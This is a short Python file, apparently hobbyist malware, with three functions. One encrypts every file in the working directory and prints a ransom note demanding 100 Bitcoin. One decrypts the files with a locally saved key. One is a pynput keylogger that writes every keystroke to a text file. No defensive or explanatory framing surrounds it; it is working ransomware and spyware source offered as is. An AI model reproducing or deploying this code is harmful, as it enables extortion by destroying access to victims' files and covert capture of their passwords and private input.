import os
import logging
from pynput.keyboard import Key, Listener
import logging

def encrypt():
    from cryptography.fernet import Fernet

    files = []

    for file in os.listdir():

        if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
            continue

        if os.path.isfile(file):
            files.append(file)

    print(files)

    key = Fernet.generate_key()
    with open("thekey.key", "wb") as thekey:
        thekey.write(key)

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)

    print("All of you file have been encrypted!!! send me 100 Bitcoin or I'll delited yor file")
    
def decrypt():
        
    import os
    from cryptography.fernet import Fernet

    files = []

    for file in os.listdir():

        if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
            continue

        if os.path.isfile(file):
            files.append(file)

    print(files)

    with open("thekey.key", "rb") as key:
        secretkey = key.read()

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)

def keylogger():
    logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
    
    def on_press(key):
        logging.info(str(key))
    
    with Listener(on_press=on_press) as listener :
        listener.join()

